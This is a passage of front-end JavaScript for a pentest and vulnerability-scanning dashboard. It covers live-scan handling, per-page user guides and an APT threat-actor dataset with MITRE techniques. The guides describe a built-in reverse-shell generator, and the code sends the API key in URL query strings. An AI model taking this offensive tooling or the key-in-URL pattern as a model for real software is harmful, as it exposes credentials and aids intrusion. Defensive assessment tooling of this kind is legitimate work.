  { key: 'REPORT',            label: 'Report\nGen',        icon: '⬡' },
];

function showLiveScan(scanId, name) {
  LIVE.scanId  = scanId;
  LIVE.name    = name || scanId.slice(0,8);
  LIVE.started = Date.now();
  LIVE.phase   = -1;
  LIVE.done    = false;
  LIVE.hosts = LIVE.ports = LIVE.services = LIVE.crit = LIVE.high = LIVE.total = 0;
  LIVE._hostSet = new Set(); LIVE._portSet = new Set(); LIVE._serviceSet = new Set();

  const panel = document.getElementById('liveScanPanel');
  if (panel) panel.style.display = '';

  _setScanDone(false);

  const nameEl = document.getElementById('liveScanName');
  if (nameEl) nameEl.textContent = name || scanId.slice(0,8);

  renderPhaseTrack(-1);
  updateLiveMetrics();
  clearTerminal();
  logToTerminal('probe', `Scan "${LIVE.name}" started — connecting to probe…`);
  logToTerminal('task', 'Phase 1/2: Host Discovery — sweeping subnet for live hosts…');
  _setStopBtn(true);
  const _rbtns = document.getElementById('liveReportBtns');
  if (_rbtns) _rbtns.style.display = 'none';

  if (LIVE._progressTimer) clearInterval(LIVE._progressTimer);
  LIVE._progressTimer = setInterval(() => {
    if (LIVE.done) { clearInterval(LIVE._progressTimer); return; }
    const secs = Math.floor((Date.now() - LIVE.started) / 1000);
    if (LIVE.total === 0) {
      logToTerminal('probe', `Host discovery in progress… (${secs}s elapsed, scanning subnet)`);
    }
  }, 8000);

  if (LIVE._timer) clearInterval(LIVE._timer);
  LIVE._timer = setInterval(() => {
    if (!LIVE.done) {
      const secs = Math.floor((Date.now() - LIVE.started) / 1000);
      const mm = String(Math.floor(secs / 60)).padStart(2,'0');
      const ss = String(secs % 60).padStart(2,'0');
      setText('liveElapsed', `${mm}:${ss}`);
    }
  }, 1000);
}

function hideLiveScan() {
  const panel = document.getElementById('liveScanPanel');
  if (panel) panel.style.display = 'none';
  if (LIVE._timer) { clearInterval(LIVE._timer); LIVE._timer = null; }
  if (LIVE._progressTimer) { clearInterval(LIVE._progressTimer); LIVE._progressTimer = null; }
  LIVE.done = true;
  _setStopBtn(false);
  _setScanDone(false);
}

function _setStopBtn(visible) {
  const btn = document.getElementById('stopScanBtn');
  if (btn) btn.style.display = visible ? '' : 'none';
}

function _setScanDone(done) {
  const badge = document.getElementById('livePulseBadge');
  const card  = document.querySelector('.live-scan-card');
  if (done) {
    if (badge) { badge.textContent = '✓ COMPLETED'; badge.classList.add('badge-done'); }
    if (card)  card.classList.add('scan-done');
  } else {
    if (badge) { badge.textContent = '● LIVE'; badge.classList.remove('badge-done'); }
    if (card)  card.classList.remove('scan-done');
  }
}

function _showReportButtons(reportId) {
  const htmlUrl = `${STATE.brainUrl}/api/v1/reports/${reportId}?api_key=${encodeURIComponent(STATE.apiKey)}`;
  const pdfUrl  = `${STATE.brainUrl}/api/v1/reports/${reportId}/pdf?api_key=${encodeURIComponent(STATE.apiKey)}`;
  const htmlBtn = document.getElementById('liveReportHtmlBtn');
  const pdfBtn  = document.getElementById('liveReportPdfBtn');
  const btns    = document.getElementById('liveReportBtns');
  if (htmlBtn) htmlBtn.href = htmlUrl;
  if (pdfBtn)  pdfBtn.href  = pdfUrl;
  if (btns)    btns.style.display = '';
}

async function stopScan() {
  if (!LIVE.scanId || LIVE.done) return;
  const ok = await showConfirm({
    title: 'Stop Scan',
    subtitle: LIVE.name || 'Running scan',
    message: 'The scan will be halted and any in-flight probe tasks will be discarded. Findings collected so far will be preserved.',
    okLabel: 'Stop Scan',
    okColor: '#f04f59',
    icon: '⏹',
    iconBg: 'rgba(240,79,89,0.15)',
  });
  if (!ok) return;
  try {
    const r = await apiFetch(`/scans/${LIVE.scanId}/stop`, { method: 'POST' });
    if (r.ok) {
      logToTerminal('warn', 'Stop requested — waiting for confirmation…');
      _setStopBtn(false);
    } else {
      const d = await r.json().catch(() => ({}));
      logToTerminal('error', `Stop failed: ${d.detail || r.status}`);
    }
  } catch (e) {
    logToTerminal('error', `Stop error: ${e.message}`);
  }
}

function renderPhaseTrack(activeIdx) {
  const track = document.getElementById('phaseTrack');
  if (!track) return;
  track.innerHTML = PHASES.map((ph, i) => {
    const state = i < activeIdx ? 'done' : i === activeIdx ? 'active' : 'pending';
    const icon  = state === 'done' ? '✓' : state === 'active' ? '●' : (i + 1).toString();
    const conn  = i < PHASES.length - 1 ? `<div class="phase-conn${i < activeIdx ? ' done' : ''}"></div>` : '';
    return `<div class="phase-item ${state}">
      <div class="phase-dot-wrap">
        <div class="phase-dot">${icon}</div>
        ${conn}
      </div>
      <div class="phase-lbl">${ph.label.replace('\n','<br>')}</div>
    </div>`;
  }).join('');
}

function advancePhase(phaseKey) {
  const idx = PHASES.findIndex(p => p.key === phaseKey || phaseKey.includes(p.key.toLowerCase().replace('_','')));
  if (idx >= 0) {
    LIVE.phase = idx;
    renderPhaseTrack(idx);
    logToTerminal('task', `Phase: ${PHASES[idx].label.replace('\n',' ')}`);
  }
}

function updateLiveMetrics() {
  setText('lmHosts',    LIVE.hosts);
  setText('lmPorts',    LIVE.ports);
  setText('lmServices', LIVE.services);
  setText('lmCritical', LIVE.crit);
  setText('lmHigh',     LIVE.high);
  setText('lmFindings', LIVE.total);
  updateOpsStats();
}

function logToTerminal(cls, msg) {
  const body = document.getElementById('scanTerminalBody');
  if (!body) return;
  const now = new Date();
  const ts  = now.toTimeString().slice(0,8);
  const line = document.createElement('div');
  line.className = `stl-line stl-${cls}`;
  line.innerHTML = `<span class="stl-ts">${ts}</span><span class="stl-msg">${esc(msg)}</span>`;
  body.appendChild(line);
  // Keep last 200 lines
  while (body.children.length > 200) body.removeChild(body.firstChild);
  body.scrollTop = body.scrollHeight;
}

function clearTerminal() {
  const body = document.getElementById('scanTerminalBody');
  if (body) body.innerHTML = '';
}

// ── Guide System ──────────────────────────────────────────────

const GUIDES = {
  dashboard: {
    icon: '⚡',
    title: 'Dashboard',
    desc: 'Your mission control — see the live security posture of your entire environment at a glance.',
    steps: [
      { t: 'Check the <strong>stat cards</strong> at the top for a quick risk pulse (critical findings, active probes, scheduled scans).' },
      { t: 'Use <strong>Quick Scan</strong> to launch a scan right now — enter a name and CIDR subnet.' },
      { t: 'When a scan is running, the <strong>Live Panel</strong> below the stats shows real-time phase progress and a live log terminal.' },
      { t: 'The <strong>Recent Scans</strong> table shows your last 5 scans — click "View Paths" to jump to attack paths or "Watch Live" to stream events.' },
      { t: 'The <strong>Severity Chart</strong> visualises the split between Critical / High / Medium / Low across all findings.' },
    ],
    tips: [
      'Critical findings (red) mean immediate compromise risk — address before anything else.',
      'If no probes are online, the orange banner will appear — follow the Probes setup guide.',
      'The live terminal uses colour-coding: purple=probe, cyan=task, orange=finding, yellow=path.',
    ],
  },
  scans: {
    icon: '⬡',
    title: 'Scans',
    desc: 'Launch, monitor, and manage autonomous scan jobs. Each scan runs a full kill-chain assessment from host discovery through vulnerability analysis.',
    steps: [
      { t: 'Click <strong>New Scan</strong> to configure a named scan with specific subnets and a probe.' },
      { t: 'Enter target subnets as CIDR notation (e.g. <code>192.168.1.0/24</code>) — multiple subnets comma-separated.' },
      { t: 'Assign a <strong>probe</strong> if you have multiple deployed; leave on "Auto-select" for the first available.' },
      { t: 'Once launched, click <strong>Watch Live</strong> on the scan row to open the live feed on the dashboard.' },
      { t: 'Completed scans can have <strong>Reports</strong> generated — navigate to Reports and select the scan.' },
    ],
    tips: [
      'Scan durations vary by subnet size — a /24 typically takes 5–15 minutes.',
      'Running multiple scans simultaneously is supported but may affect probe performance.',
      '"View Paths" navigates directly to the Attack Paths page filtered to that scan.',
    ],
  },
  findings: {
    icon: '🔍',
    title: 'Findings',
    desc: 'Every vulnerability, misconfiguration, and security weakness discovered across your network. Prioritised by severity with full CVE context.',
    steps: [
      { t: 'Filter by <strong>Scan</strong>, <strong>Severity</strong>, or <strong>Host IP</strong> using the dropdowns and search box.' },
      { t: 'Click any row to open the <strong>Finding Detail</strong> modal — see full description, CVE info, CVSS score, and remediation steps.' },
      { t: 'In the detail modal, check <strong>Compliance Tags</strong> (OWASP / PCI-DSS / NIST) to understand regulatory impact.' },
      { t: 'Use <strong>Resource Links</strong> to jump to NVD, Exploit-DB, GitHub PoCs, Shodan, and MITRE for deeper research.' },
      { t: 'Add <strong>Analyst Notes</strong> in the bottom section to record observations, reproduction steps, or triage decisions.' },
      { t: 'Mark false positives with <strong>Mark False Positive</strong> — they are hidden from counts but preserved for audit.' },
    ],
    tips: [
      'Sort by CVSS score descending to find the highest-impact issues immediately exploitable.',
      'CVE IDs are clickable — they open NVD in a new tab for full advisory details.',
      'Analyst notes persist across sessions and are visible in exported reports.',
    ],
  },
  'attack-paths': {
    icon: '🗡',
    title: 'Attack Paths',
    desc: 'Xarex models how an adversary would chain vulnerabilities together to move through your network. Each path shows entry point → pivot → target with a risk score.',
    steps: [
      { t: 'Select a <strong>scan</strong> from the dropdown to load its computed attack paths.' },
      { t: 'Paths are sorted by <strong>risk score</strong> (0–10) — the higher the score, the more exploitable the chain.' },
      { t: 'Each path shows <strong>Entry Point → Target</strong>, hop count, and estimated impact if exploited.' },
      { t: 'Click a path row to expand the <strong>full hop chain</strong> — each node shows host, service, and the technique used.' },
      { t: 'Cross-reference each path node with the <strong>Findings</strong> page for the specific CVEs enabling that hop.' },
    ],
    tips: [
      'A path with 1–2 hops is often more dangerous than a long chain — fewer steps to full compromise.',
      'Paths with "LATERAL_MOVEMENT" in the chain indicate internal network reachability from the entry host.',
      'Fix the entry point finding to break the entire chain — you do not need to fix every node.',
    ],
  },
  probes: {
    icon: '📡',
    title: 'Probes',
    desc: 'Xarex Probes are lightweight Go agents deployed inside your network. They receive scan jobs from the Cloud Brain and execute the actual assessment.',
    steps: [
      { t: 'Click <strong>Deploy Probe</strong> to see the full setup guide with build instructions and the pre-filled launch command.' },
      { t: 'The probe must be on a host that can reach your scan targets — deploy it inside the network segment you want to assess.' },
      { t: 'Once running, the probe registers automatically — its status changes to <strong>Online</strong> within 30 seconds.' },
      { t: 'Each probe shows its <strong>last seen</strong> timestamp — if a probe goes offline mid-scan the scan will pause.' },
      { t: 'You can have multiple probes in different network segments — assign them per-scan for targeted assessments.' },
    ],
    tips: [
      'Probes communicate outbound to the Cloud Brain — no inbound firewall rules needed on the probe host.',
      'The probe binary is statically compiled — no dependencies required on the target host.',
      'Run the probe as root (or with CAP_NET_RAW) for full ICMP and raw socket scanning capabilities.',
    ],
  },
  reports: {
    icon: '📋',
    title: 'Reports',
    desc: 'Automatically generated security reports for each completed scan. Includes executive summary, risk scoring, attack narrative, and remediation roadmap.',
    steps: [
      { t: 'Select a <strong>completed scan</strong> from the dropdown and click <strong>Generate Report</strong>.' },
      { t: 'Reports appear in the table below — click <strong>View AI</strong> to jump to the AI Intel page with the full analysis.' },
      { t: 'If <code>ANTHROPIC_API_KEY</code> is set, reports are powered by <strong>Claude Opus</strong> for rich narrative analysis.' },
      { t: 'Without an API key, reports use the <strong>Rules Engine</strong> — still produces risk scoring, MITRE mapping, and remediation plans.' },
      { t: 'The risk score (0–10) is calculated from finding severity weights — 2.5×Critical + 1.2×High + 0.4×Medium + 0.1×Low.' },
    ],
    tips: [
      'Share the AI Intel page directly with management — the executive summary is written for non-technical stakeholders.',
      'Quick Wins in the report are actions that can be taken today to immediately reduce risk.',
      'MITRE ATT&CK techniques in the report map to the specific findings that triggered them.',
    ],
  },
  schedules: {
    icon: '🕐',
    title: 'Schedules',
    desc: 'Automate recurring scans with cron expressions. Run nightly assessments to catch new vulnerabilities introduced by infrastructure changes.',
    steps: [
      { t: 'Click <strong>New Schedule</strong> and give it a name, a target subnet, and a probe assignment.' },
      { t: 'Enter a <strong>cron expression</strong> — e.g. <code>0 2 * * *</code> for 2am daily, <code>0 0 * * 1</code> for weekly on Monday.' },
      { t: 'Toggle <strong>Enabled</strong> to activate — the schedule will run automatically at the next matching time.' },
      { t: 'Use <strong>Run Now</strong> to immediately trigger a scheduled job outside of its cron window.' },
      { t: 'Disable a schedule temporarily without deleting it — useful during maintenance windows.' },
    ],
    tips: [
      'Cron format: minute hour day-of-month month day-of-week (5 fields).',
      'Schedule scans for off-peak hours to minimise network disruption.',
      'View historical runs in the Scans page — each scheduled trigger creates a new scan entry.',
    ],
  },
  intelligence: {
    icon: '🧠',
    title: 'AI Intel',
    desc: 'Claude-powered deep analysis of your scan results. Gets executive summaries, attack narratives, MITRE ATT&CK mapping, and a prioritised remediation plan.',
    steps: [
      { t: 'Select a <strong>completed scan</strong> from the dropdown and click <strong>Analyse with Claude</strong>.' },
      { t: 'The <strong>Executive Summary</strong> is written for C-suite — non-technical, business-risk framing.' },
      { t: 'The <strong>Attack Narrative</strong> is the technical story — how an adversary would actually exploit this environment.' },
      { t: 'The <strong>Remediation Plan</strong> is priority-ordered — fix the top item first for maximum risk reduction.' },
      { t: 'Quick Wins are fixes that take under 1 hour — patch these immediately to cut critical risk today.' },
      { t: 'MITRE ATT&CK techniques are mapped from findings — use them to tune your SIEM detection rules.' },
    ],
    tips: [
      'Add ANTHROPIC_API_KEY in Settings → .env to enable Claude Opus analysis. Without it, the rules engine is used.',
      'Re-run analysis after new findings come in — the AI will update its narrative and remediation priority.',
      'Share the risk score trend across scans with management to show security programme ROI.',
    ],
  },
  hosts: {
    icon: '🖥',
    title: 'Host Inventory',
    desc: 'A per-host view of your attack surface. Each host card shows its risk score, open ports, CVEs, and MITRE techniques at a glance.',
    steps: [
      { t: 'Filter by <strong>scan</strong> to see hosts discovered in a specific assessment.' },
      { t: 'Use the <strong>search box</strong> to filter hosts by IP address.' },
      { t: 'The <strong>ring chart</strong> on each card encodes the risk score — red means high risk, green means low.' },
      { t: 'Click a host card (or "View Findings") to jump to the Findings page filtered to that host.' },
      { t: 'Hosts with open CVEs show them in the card — hover over the CVE badge for the identifier.' },
    ],
    tips: [
      'Risk score 8–10 (red) = critical findings present — these hosts should be isolated or patched immediately.',
      'A host with many open ports but low severity findings may still be worth network segmentation.',
      'The MITRE techniques shown are inferred from findings — use them to assess the host\'s exploitation difficulty.',
    ],
  },
  diff: {
    icon: '⟷',
    title: 'Scan Diff',
    desc: 'Compare two scans to track remediation progress. See which vulnerabilities are new, which were fixed, and which persist.',
    steps: [
      { t: 'Select a <strong>Baseline</strong> scan (the earlier scan) and a <strong>Target</strong> scan (the more recent scan).' },
      { t: 'Click <strong>Compare Scans</strong> — the diff runs client-side using the full finding set of both scans.' },
      { t: 'The <strong>New</strong> tab shows findings that appeared in Target but not Baseline — these are regressions or new attack surface.' },
      { t: 'The <strong>Fixed</strong> tab shows findings in Baseline that are gone in Target — your remediation wins.' },
      { t: 'The <strong>Risk Delta</strong> shows how the overall risk score changed between the two scans (+ve = worse, -ve = better).' },
    ],
    tips: [
      'Run scans before and after a patching window to verify remediation was effective.',
      'A negative risk delta (green) means you reduced risk — use this to show progress in security reviews.',
      'Persisting critical findings in the "Same" tab are the ones that haven\'t been addressed — prioritise these.',
    ],
  },
  tools: {
    icon: '🔧',
    title: 'Pentest Tools',
    desc: 'Built-in offensive and defensive tools for security testing workflows — no external tooling required.',
    steps: [
      { t: '<strong>CVSS v3.1 Calculator</strong> — select vector components to compute a base score and vector string for your findings.' },
      { t: '<strong>Encoder / Decoder</strong> — Base64, URL, HTML entity, Hex, SHA-256, MD5. Paste input and click the operation.' },
      { t: '<strong>Reverse Shell Generator</strong> — enter your listener IP/port, pick a language (bash, python, php, powershell, etc.) and copy the command.' },
      { t: '<strong>CIDR Calculator</strong> — enter any subnet in CIDR notation to get network/broadcast, usable host range, and total hosts.' },
      { t: '<strong>JWT Decoder</strong> — paste any JWT to inspect header and payload claims. Highlights expiry and algorithm.' },
    ],
    tips: [
      'CVSS scores above 9.0 are Critical — always document the vector string in your finding for reproducibility.',
      'The reverse shell generator also shows listener commands for netcat, socat, MSF multi/handler, and pwncat.',
      'JWTs with <code>alg: none</code> or <code>RS256</code> with a symmetric key are high-severity findings — look for these.',
    ],
  },
  settings: {
    icon: '⚙',
    title: 'Settings',
    desc: 'Configure your Cloud Brain connection and API credentials. All settings are stored locally in your browser.',
    steps: [
      { t: 'The <strong>Brain URL</strong> is where your Cloud Brain API is running — default is <code>http://localhost:8005</code>.' },
      { t: 'Your <strong>API Key</strong> is set in the Cloud Brain <code>.env</code> file as <code>XAREX_API_KEY</code>.' },
      { t: 'Click <strong>Save & Reconnect</strong> to apply changes and verify connectivity.' },
      { t: 'The <strong>Connection Status</strong> indicator shows live connectivity to the Cloud Brain.' },
      { t: 'To change the Anthropic key for AI analysis, edit <code>ANTHROPIC_API_KEY</code> in the Cloud Brain <code>.env</code> file and restart.' },
    ],
    tips: [
      'API keys are stored in localStorage — clear site data to log out.',
      'If connecting to a remote Cloud Brain, ensure CORS is configured and use HTTPS in production.',
      'The Brain URL must not have a trailing slash — the app adds path segments automatically.',
    ],
  },
};

// ── Extra guide entries for new pages ─────────────────────────

Object.assign(GUIDES, {
  threats: {
    icon: '🎭',
    title: 'Threat Actor Simulation',
    desc: 'Select real-world APT groups and see exactly how exposed your environment is to their known techniques — matched against your actual discovered findings.',
    steps: [
      { t: 'Select an <strong>APT group</strong> from the left panel (APT29, Lazarus, Scattered Spider, etc.). You can search by name or nation.' },
      { t: 'The <strong>Exposure Score (0–10)</strong> shows how much of this actor\'s MITRE ATT&CK TTP profile exists in your discovered findings.' },
      { t: 'The <strong>TTP Coverage grid</strong> shows all of the actor\'s techniques — red = you have a finding that maps to it, grey = not detected.' },
      { t: 'The <strong>Vulnerable Findings</strong> section shows exactly which of your findings give this actor a foothold.' },
      { t: 'The <strong>Simulated Kill Chain</strong> shows the specific sequence of techniques this actor would use against your environment.' },
      { t: 'Click "View Attack Paths" to see modelled kill chains, or go to Findings to remediate the matched vulnerabilities.' },
    ],
    tips: [
      'An exposure score above 5 means this actor has significant viable TTPs against your environment — prioritise those matched findings.',
      'Scattered Spider and LAPSUS$ rely on social engineering and MFA fatigue — they\'re harder to detect with network scans alone.',
      'Sandworm and DarkSide target energy/critical infrastructure — if you operate in these sectors, treat their matched findings as P1.',
    ],
  },
  crownjewels: {
    icon: '💎',
    title: 'Crown Jewel Analysis',
    desc: 'Define your most business-critical assets — domain controllers, payment databases, PII repositories — and see how many attack paths lead directly to them.',
    steps: [
      { t: 'Click <strong>+ Add Crown Jewel</strong> and enter the asset name, IP address, and category (DC, Database, Payment, PII, Backup, Custom).' },
      { t: 'Each jewel card shows <strong>Direct Paths</strong> (attack paths where this asset is the explicit target) and <strong>Indirect Paths</strong> (paths that pass through this host).' },
      { t: 'The <strong>Blast Radius</strong> banner shows total exposure and estimated breach cost based on IBM DBIR 2024 averages ($4.88M baseline).' },
      { t: 'Red blast radius = 5+ paths lead to this asset — treat as critical priority regardless of individual finding severity.' },
      { t: 'Click <strong>View Attack Paths</strong> to see the specific paths and identify which entry point fixes would protect this asset.' },
      { t: 'Re-check after each patching cycle — the path count should decrease as you remediate entry point findings.' },
    ],
    tips: [
      'Always define your Domain Controller first — it\'s the highest-value target in Windows environments.',
      'An asset with 0 attack paths isn\'t necessarily safe — it may just not be discovered yet. Verify the IP matches what Xarex scanned.',
      'Fixing the entry point of an attack path protects all crown jewels that path leads to — prioritise entry points with highest fan-out.',
    ],
  },
  cvewatch: {
    icon: '📡',
    title: 'CVE Watch',
    desc: 'Real-time vulnerability intelligence from NIST NVD, automatically matched against your discovered services. Know about new CVEs before your next scheduled scan.',
    steps: [
      { t: 'Click <strong>↻ Refresh Feed</strong> to fetch the latest Critical and High CVEs from NIST NVD for the selected time window.' },
      { t: 'CVEs matching your discovered services are flagged <strong>YOUR ENV</strong> in red — these are your immediate priorities.' },
      { t: 'CVEs with a public exploit reference (GitHub, Exploit-DB, Metasploit) are flagged <strong>PoC</strong> in orange — treat as weaponised.' },
      { t: 'Click any CVE row to open the full NVD advisory in a new tab for detailed information, affected versions, and patches.' },
      { t: 'Use the <strong>time window</strong> dropdown (7/14/30 days) to widen or narrow the feed.' },
      { t: 'After patching, re-run a scan and then refresh the feed — if the affected service version changes, the match will disappear.' },
    ],
    tips: [
      'NVD API is rate-limited to ~5 requests per 30 seconds without an API key. If it fails, wait 30 seconds and retry.',
      'The service matching is keyword-based — some matches may be false positives. Always verify the affected product/version in the full NVD advisory.',
      'A CVSS ≥9.0 CVE with "YOUR ENV" flag and a PoC = treat as an active incident. Patch within hours, not days.',
    ],
  },
  topology: {
    icon: '🗺',
    title: 'Network Map',
    desc: 'An interactive force-directed graph of all discovered hosts with attack paths visualised as directional arrows. See your attack surface as an adversary would.',
    steps: [
      { t: 'Select a <strong>scan</strong> from the dropdown — the map loads all discovered hosts from that scan.' },
      { t: '<strong>Drag</strong> to pan the canvas. <strong>Scroll</strong> to zoom in and out. The layout arranges itself automatically.' },
      { t: '<strong>Node colours</strong> encode risk: red = critical (risk ≥8), orange = high (≥6), yellow = medium (≥3), green = low.' },
      { t: '<strong>Red dashed arrows</strong> are attack paths — the thicker and more opaque, the higher the risk score of that path.' },
      { t: '<strong>Click any node</strong> to open the detail panel (right side) showing risk score, open ports, CVEs, and a "View Findings" link.' },
      { t: 'Click <strong>Reset View</strong> to return to the default pan/zoom state.' },
    ],
    tips: [
      'Nodes with many arrows pointing at them are high-value targets — prioritise defending those hosts.',
      'A node with no arrows but a red ring has critical findings that aren\'t yet part of a modelled attack path — still fix them.',
      'The number shown inside each node ring is its risk score. Hover over a node for a quick summary tooltip.',
    ],
  },
});

function injectGuideBtn(page) {
  document.querySelectorAll('.guide-toggle-btn').forEach(b => b.remove());
  const titleEl = document.getElementById('pageTitle');
  if (!titleEl) return;
  const btn = document.createElement('button');
  btn.className = 'guide-toggle-btn';
  btn.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg> Guide`;
  btn.onclick = () => openGuide(page);
  titleEl.parentNode.insertBefore(btn, titleEl.nextSibling);
}

// ══════════════════════════════════════════════════════════════
//  THREAT ACTOR SIMULATION
// ══════════════════════════════════════════════════════════════

const THREAT_ACTORS = [
  { id:'apt29',     name:'APT29',          alias:'Cozy Bear / NOBELIUM',          nation:'Russia',        flag:'🇷🇺', risk_level:5,
    targets:['Government','Healthcare','Think Tanks','Technology'],
    ttps:['T1566.001','T1566.002','T1190','T1078','T1021.001','T1021.002','T1003.001','T1550.002','T1558.003','T1059.001','T1053.005','T1071.001','T1041'],
    tools:['Cobalt Strike','SUNBURST','TEARDROP','WellMess'],
    desc:'SVR-linked group with highly advanced TTPs targeting government and critical infrastructure with patient, long-term access campaigns.',
    chain:[{icon:'📧',title:'Spearphishing (T1566.001)',desc:'Tailored emails with malicious attachments to compromise specific high-value targets.'},{icon:'🔑',title:'Credential Dumping (T1003.001)',desc:'LSASS memory dump via Mimikatz to harvest domain credentials for lateral movement.'},{icon:'↔️',title:'Lateral Movement (T1021.001)',desc:'RDP and WMI traversal across the network using stolen credentials.'},{icon:'📤',title:'Slow Exfiltration (T1041)',desc:'Staged exfiltration via encrypted C2 — slow and low to evade detection.'}] },

  { id:'apt28',     name:'APT28',          alias:'Fancy Bear / STRONTIUM',        nation:'Russia',        flag:'🇷🇺', risk_level:5,
    targets:['Military','Government','Aerospace','Media','Political'],
    ttps:['T1566','T1190','T1078','T1021.001','T1040','T1003','T1550','T1071','T1048','T1082'],
    tools:['X-Agent','Zebrocy','CHOPSTICK','Sofacy'],
    desc:'GRU-linked group known for high-profile political interference, credential harvesting, and destructive operations globally.',
    chain:[{icon:'🌐',title:'Exploit Public App (T1190)',desc:'Exploitation of internet-facing services — VPNs, OWA, and web applications.'},{icon:'👤',title:'Valid Accounts (T1078)',desc:'Using harvested or purchased credentials to authenticate as legitimate users.'},{icon:'🕵️',title:'Network Sniffing (T1040)',desc:'Passive capture of credentials from unencrypted protocols on local networks.'},{icon:'📡',title:'C2 over HTTPS (T1071)',desc:'Encrypted command and control using legitimate cloud services for cover.'}] },

  { id:'lazarus',   name:'Lazarus Group',  alias:'HIDDEN COBRA / Zinc',           nation:'North Korea',   flag:'🇰🇵', risk_level:5,
    targets:['Financial','Cryptocurrency','Defense','Government'],
    ttps:['T1566','T1189','T1190','T1055','T1003','T1021','T1070','T1027','T1071','T1041','T1486'],
    tools:['AppleJeus','HOPLIGHT','DTrack','BLINDINGCAN'],
    desc:'DPRK state-sponsored group responsible for billions in crypto theft, financial institution attacks, and destructive wiper operations.',
    chain:[{icon:'📦',title:'Supply Chain (T1195)',desc:'Trojanised software packages distributed via legitimate developer channels.'},{icon:'💉',title:'Process Injection (T1055)',desc:'Code injected into legitimate processes to evade endpoint security.'},{icon:'🗑️',title:'Log Wiping (T1070)',desc:'Removal of forensic artifacts and system logs to hinder incident response.'},{icon:'💰',title:'Ransomware (T1486)',desc:'Data encryption for ransom or destructive wiper as cover for exfiltration.'}] },

  { id:'apt41',     name:'APT41',          alias:'Double Dragon / Winnti',        nation:'China',         flag:'🇨🇳', risk_level:5,
    targets:['Technology','Gaming','Telecoms','Healthcare','Manufacturing'],
    ttps:['T1566','T1190','T1078','T1021.001','T1021.002','T1059','T1053','T1003','T1550','T1082','T1016','T1071'],
    tools:['ShadowPad','CROSSWALK','Cobalt Strike','POISONPLUG'],
    desc:'Dual-mission group conducting both MSS-directed espionage and financially motivated crime simultaneously — unique in the threat landscape.',
    chain:[{icon:'🕳️',title:'Zero/N-Day Exploit (T1190)',desc:'Exploitation of public-facing applications including undisclosed vulnerabilities.'},{icon:'🐚',title:'Web Shell (T1505.003)',desc:'Persistent backdoors deployed on compromised web servers for long-term access.'},{icon:'⏰',title:'Scheduled Tasks (T1053)',desc:'Persistence via Windows Task Scheduler across compromised hosts.'},{icon:'📊',title:'Data Collection (T1082)',desc:'Systematic enumeration and exfiltration of valuable intellectual property.'}] },

  { id:'sandworm',  name:'Sandworm Team',  alias:'BlackEnergy / Voodoo Bear',     nation:'Russia',        flag:'🇷🇺', risk_level:5,
    targets:['Energy','Critical Infrastructure','Government','Media'],
    ttps:['T1190','T1078','T1021.002','T1486','T1485','T1499','T1071','T1041','T1040'],
    tools:['BlackEnergy','Industroyer','NotPetya','Exaramel'],
    desc:'GRU Unit 74455 — responsible for the Ukraine power grid attacks, NotPetya wiper ($10B damage), and Olympic Destroyer.',
    chain:[{icon:'⚡',title:'OT/ICS Targeting',desc:'Targeting operational technology systems controlling physical infrastructure.'},{icon:'💥',title:'Data Destruction (T1485)',desc:'Wiper malware deployed to destroy data and make systems unbootable.'},{icon:'📡',title:'Network DoS (T1499)',desc:'Denial of service attacks against critical operational infrastructure.'},{icon:'🔄',title:'IT→OT Lateral (T1021.002)',desc:'SMB lateral movement from IT networks into operational technology segments.'}] },

  { id:'fin7',      name:'FIN7',           alias:'Carbanak / Navigator Group',    nation:'Eastern Europe', flag:'🌐', risk_level:4,
    targets:['Retail','Hospitality','Financial','Restaurant'],
    ttps:['T1566','T1059.001','T1059.003','T1053.005','T1003.001','T1021.001','T1550.002','T1486','T1041'],
    tools:['Carbanak','GRIFFON','BOOSTWRITE','RDFSNIFFER'],
    desc:'Financially motivated criminal group responsible for $1B+ in card fraud and now deploying ransomware against enterprise targets.',
    chain:[{icon:'🎣',title:'Spearphishing (T1566)',desc:'Targeted phishing with malicious Word docs sent to specific finance employees.'},{icon:'💻',title:'PowerShell (T1059.001)',desc:'Living-off-the-land execution via PowerShell for stealthy payload delivery.'},{icon:'💳',title:'POS Memory Scraping',desc:'RAM scraping of point-of-sale systems to harvest payment card track data.'},{icon:'📤',title:'Card Exfiltration',desc:'Bulk exfiltration of harvested card data to criminal infrastructure.'}] },

  { id:'muddywater',name:'MuddyWater',     alias:'Static Kitten / Mercury',       nation:'Iran',          flag:'🇮🇷', risk_level:3,
    targets:['Government','Telecoms','Defense','Oil & Gas'],
    ttps:['T1566','T1059.001','T1059.003','T1053.005','T1027','T1071','T1082','T1016','T1003'],
    tools:['POWERSTATS','SHARPSTATS','PRB-Backdoor'],
    desc:'Iranian MOIS-linked group targeting Middle Eastern governments, telecoms, and defence contractors for persistent espionage.',
    chain:[{icon:'📄',title:'Macro Documents (T1566)',desc:'VBA macros embedded in Office documents as the primary initial access vector.'},{icon:'🔓',title:'Obfuscation (T1027)',desc:'Multiple encoding and encryption layers to bypass endpoint security products.'},{icon:'🔍',title:'System Discovery (T1082)',desc:'Enumeration of system info, active users, and network configuration.'},{icon:'📡',title:'Encrypted C2 (T1071)',desc:'Communication over HTTPS to attacker-controlled infrastructure.'}] },

  { id:'darkside',  name:'DarkSide',       alias:'BlackMatter / Carbon Spider',   nation:'Unknown',       flag:'🌐', risk_level:5,
    targets:['Energy','Manufacturing','Financial','Healthcare'],
    ttps:['T1190','T1078','T1021.001','T1486','T1490','T1489','T1041','T1083','T1003'],
    tools:['DarkSide Ransomware','Cobalt Strike','Mimikatz'],
    desc:'RaaS group responsible for the Colonial Pipeline attack. Pioneered "double extortion" — encrypting AND publishing data.',
    chain:[{icon:'🔑',title:'Credential Compromise (T1078)',desc:'Compromise of VPN/RDP credentials via brute force, phishing, or dark web purchase.'},{icon:'🕵️',title:'Credential Dumping (T1003)',desc:'Mimikatz deployed to harvest domain admin credentials for full network access.'},{icon:'💾',title:'Inhibit Recovery (T1490)',desc:'Shadow copies and backups deleted before encryption to prevent recovery.'},{icon:'🔒',title:'Ransomware (T1486)',desc:'Mass encryption across the network with double extortion demands.'}] },

  { id:'lapsus',    name:'LAPSUS$',        alias:'DEV-0537 / Strawberry Tempest', nation:'UK/Brazil',     flag:'🌐', risk_level:4,
    targets:['Technology','Telecoms','Government','Retail'],
    ttps:['T1078','T1539','T1550.001','T1621','T1566.004','T1213','T1530'],
    tools:['RedLine Stealer','MFA Bombing','Social Engineering'],
